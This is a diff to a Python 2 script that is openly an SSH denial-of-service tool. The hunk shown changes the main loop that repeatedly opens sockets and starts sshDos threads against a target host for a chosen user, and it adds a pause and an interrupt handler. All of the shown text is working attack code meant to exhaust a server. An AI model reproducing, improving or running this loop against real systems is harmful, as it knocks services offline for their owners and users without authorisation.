@@ -286,12 +286,15 @@ def main():
 						print "Trying to establish a DOS condition with user " + userfdos + " and " + str(threads) +  " threads ..."
 						print "If you see some error message probably the attack has succeeded. Press [Ctrl-Z] to stop."
 	
-						while 1 : 
+						while 1:
 	        					for att in range(threads):
 								sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 								t = Thread(target=sshDos, args=(host, port, userfdos, sock, length))
-		      						t.start()
-
+								try:
+		      							t.start()
+								except KeyboardInterrupt:
+									print "Bye !!"
+							time.sleep(10)
 					else:
 						print "No user found. Imposible to establish a DOS condition."
 						exit(1)
